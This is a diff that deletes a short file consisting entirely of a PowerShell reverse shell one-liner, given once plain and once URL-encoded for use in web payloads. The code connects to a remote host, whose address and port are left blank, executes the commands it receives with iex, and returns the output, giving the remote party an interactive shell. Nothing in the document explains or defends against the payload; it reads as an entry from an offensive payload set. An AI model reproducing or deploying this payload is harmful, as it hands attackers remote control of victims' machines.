@@ -1,7 +1,0 @@
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('',);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
-
-#############
-#URL ENCODED#
-#############
-
-powershell%20-nop%20-c%20%22$client%20=%20New-Object%20System.Net.Sockets.TCPClient('',);$stream%20=%20$client.GetStream();%5Bbyte%5B%5D%5D$bytes%20=%200..65535%7C%25%7B0%7D;while(($i%20=%20$stream.Read($bytes,%200,%20$bytes.Length))%20-ne%200)%7B;$data%20=%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes,0,%20$i);$sendback%20=%20(iex%20$data%202%3E&1%20%7C%20Out-String%20);$sendback2%20=%20$sendback%20+%20'PS%20'%20+%20(pwd).Path%20+%20'%3E%20';$sendbyte%20=%20(%5Btext.encoding%5D::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()%7D;$client.Close()%22
